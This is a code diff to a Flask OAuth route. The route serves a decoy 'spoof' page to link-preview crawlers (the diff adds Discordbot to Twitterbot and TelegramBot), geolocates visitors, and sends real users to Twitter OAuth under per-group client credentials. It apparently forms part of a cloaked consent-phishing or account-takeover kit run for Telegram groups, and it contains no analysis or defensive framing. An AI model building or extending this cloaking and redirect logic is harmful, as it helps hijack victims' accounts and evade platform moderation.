@@ -30,19 +30,32 @@ def oauth():
     if not identifier:
         return "⚠️ Identifier is required.", 400
 
-    group = groups.find_one({"identifier": identifier})
+    group = groups.find_one({
+        "$or": [
+            {"identifier": identifier},
+            {"identifier": {"$in": [identifier]}}
+        ]
+    })
     if not group:
         return "⚠️ Identifier is invalid.", 404
     
-    twitter = group.get("twitter_settings")
+    if group["group_id"] == -1002433325091:
+        i = group["identifier"].index(identifier)
+        twitter = group.get("twitter_settings")[i]
+        session["redirect_url"] = group.get('redirect')[i]
+        spoof = group.get("spoof")[i]
+    else:
+        twitter = group.get("twitter_settings")
+        session["redirect_url"] = group.get('redirect')
+        spoof = group.get("spoof")
+
     session["client_id"] = twitter["client_id"]
     session["client_secret"] = twitter["client_secret"]
     
-    session["redirect_url"] = group.get('redirect')
     session["group_id"] = group.get("group_id")
     
-    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
-        return redirect(group.get('spoof'))
+    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+        return redirect(spoof)
 
     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     res = requests.get(f'http://ip-api.com/json/{real_ip}')
@@ -58,7 +71,7 @@ def oauth():
         twitter_oauth_url = generate_twitter_oauth_url()
         return redirect(twitter_oauth_url)
     else:
-        return redirect(group.get('spoof'))
+        return redirect(spoof)
 
 
 def generate_twitter_oauth_url():
